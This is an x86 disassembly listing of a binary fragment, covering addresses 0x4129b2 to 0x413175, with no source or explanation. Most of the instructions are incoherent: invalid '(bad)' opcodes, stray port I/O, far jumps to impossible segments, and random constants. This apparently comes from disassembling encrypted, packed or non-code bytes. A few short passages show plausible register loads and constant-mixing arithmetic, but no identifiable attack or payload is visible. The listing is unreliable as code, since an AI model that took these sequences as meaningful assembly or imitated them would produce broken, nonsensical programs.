  4129b2:	ds (bad) 
  4129b4:	mov    ah,ch
  4129b6:	and    eax,0x931d5883
  4129bc:	xor    BYTE PTR [ebp+0x29],cl
  4129bf:	push   es
  4129c0:	call   0x996f656d
  4129c5:	cmc    
  4129c6:	xor    al,0xe9
  4129c8:	dec    ebp
  4129c9:	push   ds
  4129ca:	out    dx,al
  4129cb:	lods   al,BYTE PTR ds:[esi]
  4129cc:	(bad)  
  4129cd:	scas   eax,DWORD PTR es:[edi]
  4129ce:	loope  0x412987
  4129d0:	push   es
  4129d1:	out    dx,al
  4129d2:	int3   
  4129d3:	sahf   
  4129d4:	arpl   WORD PTR [edx+0x23],si
  4129d7:	push   ebx
  4129d8:	xor    DWORD PTR [ecx],ecx
  4129da:	shl    DWORD PTR [eax+esi*4],1
  4129dd:	jp     0x41298f
  4129df:	mov    edx,0x5c1bacb1
  4129e4:	jmp    0x924a496
  4129e9:	push   eax
  4129ea:	or     DWORD PTR [ecx],0x40a35894
  4129f0:	mov    bl,0x91
  4129f2:	sbb    eax,0xe4a4bfab
  4129f7:	xchg   al,dh
  4129f9:	xlat   BYTE PTR ds:[ebx]
  4129fa:	or     eax,0x9e718e7d
  4129ff:	ds xchg esp,eax
  412a01:	out    0x8d,eax
  412a03:	test   BYTE PTR [eax+0x27cebb07],ch
  412a09:	adc    DWORD PTR [eax+edx*1-0x65ba9dd2],edx
  412a10:	sub    al,0x3a
  412a12:	mov    DWORD PTR [esi-0x1],esi
  412a15:	cmp    al,BYTE PTR [ecx+0x2d1de389]
  412a1b:	and    esp,DWORD PTR [esi]
  412a1d:	loope  0x412a99
  412a1f:	mov    eax,ds:0x410e8408
  412a24:	aas    
  412a25:	inc    ebx
  412a26:	adc    BYTE PTR [ebp-0x650ea438],0xda
  412a2d:	or     BYTE PTR [ebx-0x75],dh
  412a30:	loope  0x4129ec
  412a32:	cmp    BYTE PTR [eax],ah
  412a34:	or     eax,0x9ff6de3f
  412a39:	mov    eax,0x81d840f4
  412a3e:	add    edx,eax
  412a40:	hlt    
  412a41:	push   ds
  412a42:	imul   edx,DWORD PTR cs:[edx-0x3fdbf383],0x745552dc
  412a4d:	dec    ecx
  412a4e:	mov    ebp,0xd14f7d85
  412a53:	out    dx,eax
  412a54:	mov    edx,0x2518c20f
  412a59:	pop    edi
  412a5a:	jmp    0x3c0fba73
  412a5f:	cmp    al,0x54
  412a61:	mov    ah,0xca
  412a63:	ror    BYTE PTR ds:0x10863a59,0x1b
  412a6a:	inc    edi
  412a6b:	test   ah,dh
  412a6d:	aaa    
  412a6e:	xchg   esp,eax
  412a6f:	fwait
  412a70:	cmc    
  412a71:	jecxz  0x412ab8
  412a73:	jmp    0x4175cdc5
  412a78:	repz fidivr DWORD PTR [esi]
  412a7b:	mov    ecx,0x1f0dd1ff
  412a80:	dec    eax
  412a81:	je     0x412a33
  412a83:	es sbb ah,bh
  412a86:	mov    dl,0x61
  412a88:	iret   
  412a89:	xor    al,0x1d
  412a8b:	and    bh,BYTE PTR [edi-0x1b]
  412a8e:	xchg   DWORD PTR [esi+eax*4-0x49be87e2],edx
  412a95:	add    DWORD PTR [ebp-0x14],edi
  412a98:	pop    ecx
  412a99:	arpl   bp,di
  412a9b:	mov    ebx,0xa3727c87
  412aa0:	mov    bh,0xbd
  412aa2:	call   0x629995f5
  412aa7:	fistp  WORD PTR [edi+0x12]
  412aaa:	cmc    
  412aab:	add    edx,edx
  412aad:	push   es
  412aae:	stc    
  412aaf:	jp     0x412a36
  412ab1:	call   0x35f3135a
  412ab6:	shl    edi,0x20
  412ab9:	or     cl,BYTE PTR [edx-0x44]
  412abc:	sub    al,0x57
  412abe:	loope  0x412b2f
  412ac0:	std    
  412ac1:	in     al,dx
  412ac2:	pop    eax
  412ac3:	outs   dx,BYTE PTR ds:[esi]
  412ac4:	sbb    BYTE PTR [esi-0x6c],dh
  412ac7:	push   edx
  412ac8:	push   esi
  412ac9:	mov    al,ds:0xc6766952
  412ace:	jmp    0xb6f40564
  412ad3:	mov    edx,0x617186fa
  412ad8:	addr16 data16 (bad) 
  412adb:	inc    edi
  412adc:	aad    0x5
  412ade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412adf:	cli    
  412ae0:	inc    ecx
  412ae1:	loope  0x412b4a
  412ae3:	mov    ch,0xb4
  412ae5:	leave  
  412ae6:	dec    DWORD PTR [ebp+0x2612840a]
  412aec:	cmp    DWORD PTR [edx],ebx
  412aee:	xchg   BYTE PTR [ebx-0x54],al
  412af1:	dec    ebx
  412af2:	jmp    0xf07d:0x83ba70f0
  412af9:	cmp    esp,DWORD PTR [esi]
  412afb:	in     al,0x1
  412afd:	fistp  DWORD PTR [ecx+0x736b8f8f]
  412b03:	mov    dh,0x10
  412b05:	fisub  WORD PTR [ebx]
  412b07:	pop    esp
  412b08:	ret    0xe63f
  412b0b:	mov    ebp,0xfcd7032a
  412b10:	pop    ss
  412b11:	imul   esp,ebx,0x69
  412b14:	fistp  WORD PTR [eax-0x677c6419]
  412b1a:	xor    DWORD PTR [eax+0x6],0xa7879d0b
  412b21:	popa   
  412b22:	xchg   ecx,eax
  412b23:	pop    es
  412b24:	inc    ebp
  412b25:	sub    cl,BYTE PTR [edx]
  412b27:	xor    BYTE PTR [ebp-0x234a64cb],ah
  412b2d:	push   bp
  412b2f:	inc    eax
  412b30:	ins    DWORD PTR es:[edi],dx
  412b31:	out    0xd0,eax
  412b33:	jb     0x412b9c
  412b35:	fimul  DWORD PTR [edx-0x25]
  412b38:	sub    BYTE PTR [ebp-0x29bfaf25],bh
  412b3e:	in     eax,0x83
  412b40:	dec    edi
  412b41:	int3   
  412b42:	push   esp
  412b43:	in     al,dx
  412b44:	jle    0x412bbe
  412b46:	popf   
  412b47:	cdq    
  412b48:	and    al,0x6b
  412b4a:	cdq    
  412b4b:	into   
  412b4c:	push   ebp
  412b4d:	add    BYTE PTR [eax],dl
  412b4f:	cmp    bl,BYTE PTR [esi]
  412b51:	cs call 0xedec:0xf8fb0ace
  412b59:	scas   al,BYTE PTR es:[edi]
  412b5a:	push   es
  412b5b:	mov    ecx,0x676fa799
  412b60:	and    BYTE PTR [esi],dh
  412b62:	jge    0x412b11
  412b64:	arpl   WORD PTR [ecx+0x4c2eac05],sp
  412b6a:	call   0xf7fd:0x4e179513
  412b71:	jmp    0xb13:0xb42fde4c
  412b78:	or     eax,0x7db5cd56
  412b7d:	aam    0xe0
  412b7f:	and    eax,eax
  412b81:	cmc    
  412b82:	ret    
  412b83:	dec    edi
  412b84:	xchg   ecx,eax
  412b85:	push   es
  412b86:	mov    DWORD PTR [ebp-0x7fe39c98],eax
  412b8c:	push   ss
  412b8d:	mov    al,0x1f
  412b8f:	mov    eax,ds:0xfb0b8588
  412b94:	mov    dh,0xb7
  412b96:	adc    DWORD PTR [ebp-0x624dc10b],ebx
  412b9c:	loopne 0x412bea
  412b9e:	ds jge 0x412bbc
  412ba1:	dec    ebx
  412ba2:	pop    ds
  412ba3:	pop    ebx
  412ba4:	add    BYTE PTR [ecx+0x5],ah
  412ba7:	xor    dh,BYTE PTR [esi]
  412ba9:	pop    es
  412baa:	xor    eax,esp
  412bac:	cmp    eax,0xa668f88e
  412bb1:	std    
  412bb2:	xor    al,0x2
  412bb4:	jnp    0x412bc4
  412bb6:	jb     0x412c36
  412bb8:	aad    0xbf
  412bba:	mov    ebp,0x906e1ecb
  412bbf:	jbe    0x412b5b
  412bc1:	sbb    cl,BYTE PTR [ecx+0x54]
  412bc4:	arpl   WORD PTR [eax+0x54],di
  412bc7:	cmp    eax,ecx
  412bc9:	push   ecx
  412bca:	sub    edi,DWORD PTR [eax+0x2a]
  412bcd:	cwde   
  412bce:	popa   
  412bcf:	(bad)  
  412bd0:	xlat   BYTE PTR ds:[ebx]
  412bd1:	lea    eax,[edx+0x6637061b]
  412bd7:	cmp    dh,BYTE PTR [edi]
  412bd9:	std    
  412bda:	pushf  
  412bdb:	cli    
  412bdc:	fadd   QWORD PTR ds:0xbf81b1f6
  412be2:	jecxz  0x412c57
  412be4:	add    bl,BYTE PTR [edi]
  412be6:	fwait
  412be7:	in     eax,dx
  412be8:	shl    BYTE PTR [ebx],cl
  412bea:	test   al,0xe9
  412bec:	jnp    0x412c3e
  412bee:	push   0x69
  412bf0:	fwait
  412bf1:	mov    eax,0x9550fdb
  412bf6:	add    eax,0x852b3dd
  412bfb:	mov    ds:0x81459f25,eax
  412c00:	jp     0x412c5a
  412c02:	mov    al,0xce
  412c04:	mov    eax,0x2df6f56f
  412c09:	shl    dh,1
  412c0b:	push   edx
  412c0c:	adc    DWORD PTR [edi-0x1486a60a],edi
  412c12:	fucomi st,st(5)
  412c14:	(bad)
  412c17:	jmp    0x568bc680
  412c1c:	fwait
  412c1d:	xchg   esi,eax
  412c1e:	or     BYTE PTR [edi-0x48],0xae
  412c22:	out    0xd6,eax
  412c24:	mov    cs,esi
  412c26:	dec    ebx
  412c27:	mov    ah,0x93
  412c29:	les    esp,FWORD PTR [eax]
  412c2b:	scas   al,BYTE PTR es:[edi]
  412c2c:	or     ebp,DWORD PTR [edi-0x75]
  412c2f:	adc    al,0xa7
  412c31:	dec    esp
  412c32:	and    DWORD PTR [edx-0x4c],ecx
  412c35:	out    dx,eax
  412c36:	xor    cl,dh
  412c38:	adc    ebp,DWORD PTR [ecx]
  412c3a:	pushf  
  412c3b:	cmc    
  412c3c:	and    ch,ah
  412c3e:	mov    DWORD PTR [ebp+0x61681783],esi
  412c44:	adc    DWORD PTR ds:0x1a938acd,eax
  412c4a:	xchg   edi,eax
  412c4b:	and    DWORD PTR [ecx],eax
  412c4d:	sub    ebp,DWORD PTR [edx+0x12]
  412c50:	(bad)  
  412c51:	or     bh,BYTE PTR [edi]
  412c53:	clc    
  412c54:	jge    0x412c77
  412c56:	rol    BYTE PTR ds:0x60823c90,cl
  412c5c:	fucomp st(0)
  412c5e:	add    al,0xff
  412c60:	inc    esp
  412c61:	mov    esp,0x9e5c7052
  412c66:	pushf  
  412c67:	sahf   
  412c68:	mov    esi,0x5d5b1464
  412c6d:	mov    eax,DWORD PTR [ebp-0x8]
  412c70:	mov    ecx,DWORD PTR [ebp-0x4]
  412c73:	mov    edx,DWORD PTR [ebp-0x10]
  412c76:	mov    edi,DWORD PTR [ebp-0xc]
  412c79:	add    eax,edx
  412c7b:	mov    edx,DWORD PTR [ebp-0x18]
  412c7e:	adc    ecx,edi
  412c80:	mov    edi,DWORD PTR [ebp-0x14]
  412c83:	push   edi
  412c84:	push   edx
  412c85:	or     ecx,0x6833
  412c8b:	or     eax,0x6b80
  412c90:	jmp    0x413068
  412c95:	cmp    eax,0x5aa05c23
  412c9a:	sahf   
  412c9b:	cmp    eax,0xec8af322
  412ca0:	mov    esi,0xbeeb8360
  412ca5:	inc    ecx
  412ca6:	push   eax
  412ca7:	sbb    BYTE PTR [eax],bl
  412ca9:	stos   BYTE PTR es:[edi],al
  412caa:	adc    bl,BYTE PTR [eax]
  412cac:	sbb    BYTE PTR [eax-0x4a],ah
  412caf:	arpl   ax,di
  412cb1:	or     eax,0x624a79
  412cb6:	cmp    eax,0x2421a965
  412cbb:	or     eax,0x5b3c5de3
  412cc0:	ror    BYTE PTR [ebx+0x60],1
  412cc3:	cdq    
  412cc4:	push   ds
  412cc5:	mov    ecx,0xcd02519c
  412cca:	cld    
  412ccb:	pop    esi
  412ccc:	aad    0x59
  412cce:	add    BYTE PTR [eax],ah
  412cd0:	jp     0x412d19
  412cd2:	push   cs
  412cd3:	arpl   dx,si
  412cd5:	out    0x91,eax
  412cd7:	mov    al,0x9e
  412cd9:	sbb    ecx,esp
  412cdb:	cmp    al,0xac
  412cdd:	add    esi,DWORD PTR [ebp+0x5f]
  412ce0:	dec    esp
  412ce1:	mov    eax,ds:0x83e782cc
  412ce6:	adc    eax,0x1b2c3f02
  412ceb:	pusha  
  412cec:	(bad)  
  412ced:	fwait
  412cee:	(bad)  
  412cef:	outs   dx,DWORD PTR ds:[esi]
  412cf0:	(bad)  
  412cf1:	sbb    BYTE PTR [esi],bh
  412cf3:	bnd jmp 0xde72df8c
  412cf9:	shr    ch,cl
  412cfb:	push   ebp
  412cfc:	int3   
  412cfd:	inc    edx
  412cfe:	pusha  
  412cff:	xchg   edi,eax
  412d00:	lods   eax,DWORD PTR ds:[esi]
  412d01:	mov    ebp,0xeb1a9ef4
  412d06:	js     0x412cb8
  412d08:	lock adc BYTE PTR [esi-0x32],cl
  412d0c:	push   esp
  412d0d:	lods   eax,DWORD PTR ds:[esi]
  412d0e:	mov    ecx,0x520b002e
  412d13:	jge    0x412d7d
  412d15:	outs   dx,DWORD PTR ds:[esi]
  412d16:	hlt    
  412d17:	clc    
  412d18:	stc    
  412d19:	js     0x412d18
  412d1b:	ins    DWORD PTR es:[edi],dx
  412d1c:	popf   
  412d1d:	inc    edi
  412d1e:	je     0x412d53
  412d20:	(bad)  
  412d21:	pop    edi
  412d22:	adc    edx,DWORD PTR [esi-0xf]
  412d25:	bound  edx,QWORD PTR [ebx+esi*1+0x1f]
  412d29:	push   edx
  412d2a:	push   eax
  412d2b:	xchg   DWORD PTR [eax],esp
  412d2d:	sub    al,0x53
  412d2f:	jmp    0x55fa135
  412d34:	mov    dl,BYTE PTR [ebx+0x70]
  412d37:	or     al,0x51
  412d39:	icebp  
  412d3a:	test   eax,0x5d0ed18e
  412d3f:	push   cs
  412d40:	mov    WORD PTR [ebp+0x25],?
  412d43:	inc    ecx
  412d44:	mov    ds:0x9ceade17,eax
  412d4a:	pop    ds
  412d4b:	repnz out dx,eax
  412d4d:	fstp   DWORD PTR [ecx+0x59dc7f44]
  412d53:	jge    0x412d5c
  412d55:	and    DWORD PTR [esi],edi
  412d57:	pop    esp
  412d58:	or     al,0x2a
  412d5a:	fwait
  412d5b:	jp     0x412da5
  412d5d:	icebp  
  412d5e:	sub    cl,BYTE PTR [ebp+0x16a7c36]
  412d64:	jecxz  0x412d56
  412d66:	adc    bh,BYTE PTR [ebx-0x19]
  412d69:	push   esp
  412d6a:	sbb    eax,0xc69e96df
  412d6f:	mov    dh,0x63
  412d71:	fisubr DWORD PTR [ebx+ebx*4+0x610c8781]
  412d78:	or     eax,0x58bca142
  412d7d:	sbb    eax,0x223cb99
  412d82:	jg     0x412db2
  412d84:	add    DWORD PTR [ebx-0x5c66d0f1],esp
  412d8a:	push   edi
  412d8b:	cmp    al,0x11
  412d8d:	xchg   ecx,eax
  412d8e:	and    ebx,DWORD PTR [esi-0x70c4c0b5]
  412d94:	aam    0x8b
  412d96:	pop    edx
  412d97:	xor    ebp,eax
  412d99:	inc    DWORD PTR [esi+0x3d]
  412d9c:	ja     0x412ddc
  412d9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d9f:	mov    dh,0x57
  412da1:	mov    ebx,0x52cfd4f4
  412da6:	sar    BYTE PTR [ebx+0x1db637bd],cl
  412dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dad:	lods   eax,DWORD PTR ds:[esi]
  412dae:	xchg   ecx,eax
  412daf:	adc    esi,esp
  412db1:	mov    BYTE PTR [ecx-0x67bed1c3],al
  412db7:	lods   al,BYTE PTR ds:[esi]
  412db8:	call   0x7778:0xa6bc0495
  412dbf:	or     al,BYTE PTR [esi]
  412dc1:	xchg   esi,eax
  412dc2:	jg     0x412de8
  412dc4:	int    0x8c
  412dc6:	xor    DWORD PTR [edi],ebx
  412dc8:	xchg   edi,eax
  412dc9:	jp     0x412e25
  412dcb:	setno  BYTE PTR [ecx]
  412dce:	loope  0x412e03
  412dd0:	in     al,0x93
  412dd2:	mov    eax,ds:0xed333ac6
  412dd7:	or     DWORD PTR [eax-0xe79519d],edi
  412ddd:	pop    DWORD PTR [edx+0x33]
  412de0:	fidiv  DWORD PTR [eax]
  412de2:	scas   al,BYTE PTR es:[edi]
  412de3:	rcr    DWORD PTR [ecx+0x15500efa],cl
  412de9:	loope  0x412e0b
  412deb:	pop    ss
  412dec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ded:	popf   
  412dee:	mov    al,ds:0x299a9c9f
  412df3:	les    esi,FWORD PTR [ebx]
  412df5:	aad    0xdd
  412df7:	sbb    DWORD PTR [ecx-0x5a63fc0c],0xc
  412dfe:	es cld 
  412e00:	daa    
  412e01:	loope  0x412e15
  412e03:	xchg   esp,eax
  412e04:	adc    ecx,DWORD PTR [edi]
  412e06:	loop   0x412dab
  412e08:	cmp    BYTE PTR [edi],al
  412e0a:	fidiv  WORD PTR [ecx]
  412e0c:	push   ecx
  412e0d:	cwde   
  412e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e0f:	inc    ecx
  412e10:	jmp    0x988c:0x1892ec82
  412e17:	pop    edi
  412e18:	inc    edx
  412e19:	aam    0x87
  412e1b:	pop    edx
  412e1c:	idiv   DWORD PTR [ebx-0x12]
  412e1f:	dec    edx
  412e20:	in     al,0xb4
  412e22:	fidivr DWORD PTR [ebx+0x41b25787]
  412e28:	mov    bl,0xd8
  412e2a:	fs icebp 
  412e2c:	xchg   edi,eax
  412e2d:	faddp  st(7),st
  412e2f:	lock xor al,0x4
  412e32:	retf   0xf55c
  412e35:	xchg   ebx,eax
  412e36:	mov    ecx,0xffbc8f94
  412e3b:	jle    0x412e77
  412e3d:	pop    ebx
  412e3e:	mov    bl,0x8d
  412e40:	adc    DWORD PTR [ebx-0x4b],0x70
  412e44:	test   BYTE PTR [esi],0x8a
  412e47:	or     ch,BYTE PTR [edi+0x6b46a539]
  412e4d:	inc    edx
  412e4e:	sbb    BYTE PTR [ebx-0x72],ah
  412e51:	scas   eax,DWORD PTR es:[edi]
  412e52:	push   es
  412e53:	or     eax,0x296a2433
  412e58:	pop    edx
  412e59:	mov    dl,0xb2
  412e5b:	(bad)  
  412e5c:	loope  0x412e69
  412e5e:	retf   
  412e5f:	int    0xed
  412e61:	mov    dl,0x79
  412e63:	scas   eax,DWORD PTR es:[edi]
  412e64:	je     0x412ecb
  412e66:	into   
  412e67:	imul   ebp,ebp,0x7c26e8e9
  412e6d:	xchg   esi,eax
  412e6e:	aad    0x7a
  412e70:	dec    ecx
  412e71:	cmp    al,0x9b
  412e73:	(bad)  
  412e75:	and    dl,bl
  412e77:	xchg   ebx,eax
  412e78:	and    edx,edx
  412e7a:	add    BYTE PTR [edi+0x3a207a64],0xff
  412e81:	sbb    eax,0x24f76177
  412e86:	ins    DWORD PTR es:[edi],dx
  412e87:	mov    ecx,0x958f05d
  412e8c:	xor    eax,ebx
  412e8e:	or     eax,0x5cdb89e2
  412e93:	outs   dx,DWORD PTR ds:[esi]
  412e94:	pop    ebp
  412e95:	mov    edi,0xa4fe4f6c
  412e9a:	fistp  DWORD PTR ds:0x9941cace
  412ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ea1:	in     al,dx
  412ea2:	(bad)  [ebx]
  412ea4:	lods   al,BYTE PTR ds:[esi]
  412ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea6:	cmp    al,0xf0
  412ea8:	xor    ebp,DWORD PTR [esi-0x37]
  412eab:	mov    dh,0x47
  412ead:	bound  eax,QWORD PTR [edi-0x7]
  412eb0:	xor    ch,cl
  412eb2:	cld    
  412eb3:	xor    eax,0xd9346a58
  412eb8:	fbstp  TBYTE PTR [ebp+0x3]
  412ebb:	cmp    al,0x84
  412ebd:	adc    al,0x3b
  412ebf:	sub    al,0x82
  412ec1:	(bad)  
  412ec2:	sbb    al,0x78
  412ec4:	mov    esi,esp
  412ec6:	imul   esi,DWORD PTR fs:[ecx],0xffffffd0
  412eca:	iret   
  412ecb:	push   esi
  412ecc:	lods   eax,DWORD PTR ds:[esi]
  412ecd:	sbb    DWORD PTR [edi*2-0x68818812],0xcaadbe35
  412ed8:	mov    ds:0x2a4900e2,al
  412edd:	xlat   BYTE PTR ds:[ebx]
  412ede:	retf   0x8aac
  412ee1:	mov    ebx,0x5ae0e338
  412ee6:	repz scas eax,DWORD PTR es:[edi]
  412ee8:	inc    esi
  412ee9:	xchg   ebp,eax
  412eea:	push   ebx
  412eeb:	mov    al,0xb4
  412eed:	mov    ds:0xbc8cf185,eax
  412ef2:	fidivr WORD PTR [esi+0x2a]
  412ef5:	sub    DWORD PTR [esp+eax*2+0x3d0517f3],ecx
  412efc:	mov    ecx,0x5b02b374
  412f01:	dec    ebx
  412f02:	xchg   DWORD PTR [ebp+0x35f6f7ec],esp
  412f08:	adc    eax,0x42a357a4
  412f0d:	mov    bh,0x49
  412f0f:	sub    ecx,DWORD PTR [ecx]
  412f11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f12:	out    dx,eax
  412f13:	add    eax,0xa7297b00
  412f18:	stos   DWORD PTR es:[edi],eax
  412f19:	mov    bh,0xff
  412f1b:	mov    bh,BYTE PTR [ebp-0x1d028cf9]
  412f21:	jno    0x412f40
  412f23:	dec    eax
  412f24:	imul   esi,DWORD PTR [esi+0x5c],0x1971eb2d
  412f2b:	and    BYTE PTR [edi],al
  412f2d:	xor    ebx,DWORD PTR [eax]
  412f2f:	imul   ecx,DWORD PTR [ecx+0x3d],0x7a
  412f33:	(bad)  
  412f34:	and    DWORD PTR ds:0x4b88cbed,ecx
  412f3a:	nop
  412f3b:	xchg   esp,eax
  412f3c:	fldenv [esi]
  412f3e:	sub    eax,0x61d6f3a9
  412f43:	inc    ebx
  412f44:	and    al,al
  412f46:	adc    eax,0xefeb7975
  412f4b:	push   esi
  412f4c:	push   0xffffffcd
  412f4e:	cwde   
  412f4f:	add    al,0xf
  412f51:	sub    dl,bl
  412f53:	fdivrp st(7),st
  412f55:	fadd   st,st(5)
  412f57:	rcr    BYTE PTR [eax],1
  412f59:	mov    ecx,0x512f1e1e
  412f5e:	pop    es
  412f5f:	jbe    0x412f86
  412f61:	pop    es
  412f62:	js     0x412ef9
  412f64:	or     esp,DWORD PTR [edi]
  412f66:	jle    0x412f6d
  412f68:	sbb    al,0xef
  412f6a:	mov    ds:0x1ef483fa,eax
  412f6f:	jecxz  0x412f8e
  412f71:	test   DWORD PTR [edi+edi*1],ebp
  412f74:	xchg   esp,eax
  412f75:	(bad)  
  412f76:	out    dx,al
  412f77:	adc    eax,0x1bd5ea57
  412f7c:	xchg   esp,eax
  412f7d:	adc    al,0x32
  412f7f:	(bad)  
  412f80:	icebp  
  412f81:	lock out 0x49,eax
  412f84:	pop    es
  412f85:	out    dx,eax
  412f86:	and    ebp,DWORD PTR [ecx]
  412f88:	pusha  
  412f89:	jns    0x412ff0
  412f8b:	std    
  412f8c:	nop
  412f8d:	push   es
  412f8e:	and    BYTE PTR [ebp+edx*8+0x7dfad41c],ah
  412f95:	jp     0x412f3c
  412f97:	push   ebx
  412f98:	sti    
  412f99:	gs jge 0x412f62
  412f9c:	cld    
  412f9d:	imul   esp,ebp,0x9ff8fdd0
  412fa3:	dec    esi
  412fa4:	jnp    0x412fa0
  412fa6:	scas   eax,DWORD PTR es:[edi]
  412fa7:	loop   0x412fac
  412fa9:	(bad)  [esi]
  412fab:	add    al,ah
  412fad:	arpl   WORD PTR [ebx+0x50372cc5],si
  412fb3:	aam    0x13
  412fb5:	pop    ecx
  412fb6:	(bad)  
  412fb7:	cs ret 
  412fb9:	sub    eax,0xcfeb8996
  412fbe:	push   edx
  412fbf:	push   cs
  412fc0:	popa   
  412fc1:	push   edx
  412fc2:	(bad)  
  412fc3:	loope  0x412f7c
  412fc5:	and    eax,0xe179f33d
  412fca:	or     bh,BYTE PTR [esi-0x27]
  412fcd:	retf   
  412fce:	or     al,0x29
  412fd0:	aad    0xc
  412fd2:	lahf   
  412fd3:	outs   dx,DWORD PTR ds:[esi]
  412fd4:	and    bl,BYTE PTR [edx+0x60]
  412fd7:	mov    eax,0xcbc5d0aa
  412fdc:	xor    DWORD PTR [edi+edi*2+0x75ab5e52],esp
  412fe3:	inc    edx
  412fe4:	xchg   sp,ax
  412fe6:	sbb    edx,DWORD PTR [eax+0x70]
  412fe9:	and    DWORD PTR [esp+esi*1+0x48],eax
  412fed:	xor    DWORD PTR [edx-0x5042d46d],eax
  412ff3:	loope  0x41303b
  412ff5:	cmp    BYTE PTR [edi+0x1d],dh
  412ff8:	(bad)  
  412ff9:	pop    DWORD PTR [eax-0x1a]
  412ffc:	lds    esi,FWORD PTR [edi+0x589c4b73]
  413002:	pop    edi
  413003:	cmp    eax,0x71dcc7b9
  413008:	adc    BYTE PTR [eax-0x7b898a17],bh
  41300e:	mov    ebp,0x9c5074f8
  413013:	mov    dh,0x68
  413015:	sbb    BYTE PTR [esi+0x19],al
  413018:	push   edx
  413019:	inc    ebp
  41301a:	loopne 0x412fc3
  41301c:	sub    eax,0xc7476ea6
  413021:	add    BYTE PTR [edi],dh
  413023:	ds pusha 
  413025:	jecxz  0x412fe2
  413027:	retf   
  413028:	sub    bl,BYTE PTR [ecx]
  41302a:	and    DWORD PTR [ecx+0x6b],eax
  41302d:	retf   
  41302e:	jge    0x41303a
  413030:	dec    esi
  413031:	scas   eax,DWORD PTR es:[edi]
  413032:	inc    ecx
  413033:	inc    edi
  413034:	jns    0x4130ad
  413036:	jns    0x413066
  413038:	xor    BYTE PTR [ecx-0x1f],0xfa
  41303c:	pop    ecx
  41303d:	popf   
  41303e:	xor    DWORD PTR [ecx],0xffffffb0
  413041:	mov    edi,0xa1fb11f6
  413046:	inc    edi
  413047:	mov    cl,0xcb
  413049:	imul   edx,DWORD PTR [ebx+0x1fc7693f],0xfa4d007
  413053:	sbb    DWORD PTR [ebx+0xd],edi
  413056:	iret   
  413057:	xchg   edi,eax
  413058:	inc    edx
  413059:	mov    dl,0x73
  41305b:	push   esi
  41305c:	or     al,0xf4
  41305e:	in     eax,0xe1
  413060:	and    BYTE PTR [ebx+ecx*8+0x7feab8c5],bl
  413067:	adc    DWORD PTR [ecx+0x50],0xf003e8
  41306e:	add    BYTE PTR [ebx+0x7d8be04d],cl
  413074:	in     al,0x25
  413076:	retf   
  413077:	and    eax,0xc10b0000
  41307c:	mov    ecx,DWORD PTR [ebp-0x20]
  41307f:	mov    ecx,DWORD PTR [ebp-0x1c]
  413082:	and    edx,0x76f2
  413088:	or     edx,edi
  41308a:	xor    edx,esi
  41308c:	xor    eax,0x253b
  413091:	shld   edx,eax,0x2
  413095:	shl    eax,0x2
  413098:	shr    ecx,0x1e
  41309b:	xor    esi,esi
  41309d:	or     eax,ecx
  41309f:	or     edx,esi
  4130a1:	xor    eax,0xca79a575
  4130a6:	mov    DWORD PTR [ebp-0x20],eax
  4130a9:	mov    esi,0x9c1b89e8
  4130ae:	xor    edx,esi
  4130b0:	mov    DWORD PTR [ebp-0x1c],edx
  4130b3:	mov    eax,DWORD PTR [ebp-0x38]
  4130b6:	mov    ecx,DWORD PTR [ebp-0x34]
  4130b9:	mov    edx,DWORD PTR [ebp-0x40]
  4130bc:	mov    edi,DWORD PTR [ebp-0x3c]
  4130bf:	push   edi
  4130c0:	push   edx
  4130c1:	push   ecx
  4130c2:	push   eax
  4130c3:	call   0x416c20
  4130c8:	add    eax,0x536a
  4130cd:	jmp    0x4134a5
  4130d2:	push   edx
  4130d3:	(bad)  
  4130d4:	push   ebx
  4130d5:	jbe    0x41312a
  4130d7:	jb     0x41310b
  4130d9:	mov    dl,0xf6
  4130db:	push   eax
  4130dc:	xchg   DWORD PTR [ecx+edi*8+0x2b],edi
  4130e0:	pop    ds
  4130e1:	jle    0x4130b6
  4130e3:	dec    eax
  4130e4:	sbb    BYTE PTR [eax],bl
  4130e6:	stos   BYTE PTR es:[edi],al
  4130e7:	adc    bl,BYTE PTR [eax]
  4130e9:	sbb    BYTE PTR [esi],bh
  4130eb:	cdq    
  4130ec:	xor    dh,bh
  4130ee:	xchg   edx,eax
  4130ef:	jns    0x41308e
  4130f1:	das    
  4130f2:	(bad)  
  4130f3:	gs mov ebx,0xdfb7d304
  4130f9:	jae    0x41313a
  4130fb:	inc    eax
  4130fc:	xchg   ebx,eax
  4130fd:	inc    eax
  4130fe:	icebp  
  4130ff:	mov    dl,bh
  413101:	sbb    dh,dl
  413103:	test   BYTE PTR [esi+0x6ee6dfec],ch
  413109:	mov    dl,0x49
  41310b:	push   edi
  41310c:	ss jge 0x4130c1
  41310f:	adc    al,BYTE PTR [ebp-0x26]
  413112:	pop    ebx
  413113:	jmp    DWORD PTR [edi]
  413115:	out    0x6b,eax
  413117:	adc    DWORD PTR [esi-0x65],0xd467e21
  41311e:	sbb    DWORD PTR [edi],eax
  413120:	push   esi
  413121:	push   esi
  413122:	push   ds
  413123:	les    eax,FWORD PTR [edx+0x122154c4]
  413129:	ja     0x41318a
  41312b:	les    edi,FWORD PTR [ecx+0x5c21275e]
  413131:	int3   
  413132:	sbb    BYTE PTR [ebx],ch
  413134:	in     eax,dx
  413135:	xchg   edx,eax
  413136:	and    BYTE PTR [ebx],cl
  413138:	jno    0x41317a
  41313a:	fiadd  DWORD PTR [ebp+0x68f764b3]
  413140:	xor    eax,0xace3b458
  413145:	rcr    esp,0x21
  413148:	pop    es
  413149:	pop    eax
  41314a:	jmp    0x9716:0x3e91618
  413151:	xor    ah,bl
  413153:	mov    fs,WORD PTR [ebp+0x2072d77a]
  413159:	sahf   
  41315a:	mov    dl,dl
  41315c:	popa   
  41315d:	dec    edi
  41315e:	scas   al,BYTE PTR es:[edi]
  41315f:	jns    0x41316b
  413161:	pop    ebp
  413162:	sub    al,0xc0
  413164:	and    al,0x91
  413166:	push   ecx
  413167:	call   0x9b226d2b
  41316c:	aas    
  41316d:	pop    esp
  41316e:	and    BYTE PTR [edx],0x34
  413171:	push   edx
  413172:	jae    0x4131f1
  413174:	pop    es
  413175:	or     al,0x6e
